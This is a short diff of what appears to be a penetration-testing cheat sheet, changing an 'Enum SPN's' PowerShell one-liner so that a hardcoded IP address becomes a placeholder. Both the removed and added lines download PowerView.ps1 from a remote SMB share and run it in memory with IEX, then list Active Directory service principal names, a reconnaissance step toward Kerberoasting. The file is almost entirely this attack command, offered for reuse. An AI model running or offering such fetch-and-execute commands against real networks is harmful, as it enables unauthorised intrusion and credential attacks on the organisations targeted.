@@ -21,4 +21,4 @@ Powershell LDAP Query Terms
 
 Enum SPN's Oneliner SMBv2
 
-```IEX(New-Object Net.webClient).downloadString('\\192.168.119.135\pwn\PowerView.ps1');Get-SPN -type service -search "*" -List yes | Format-Table -AutoSize```
+```IEX(New-Object Net.webClient).downloadString('\\<IPADDRESS>\pwn\PowerView.ps1');Get-SPN -type service -search "*" -List yes | Format-Table -AutoSize```
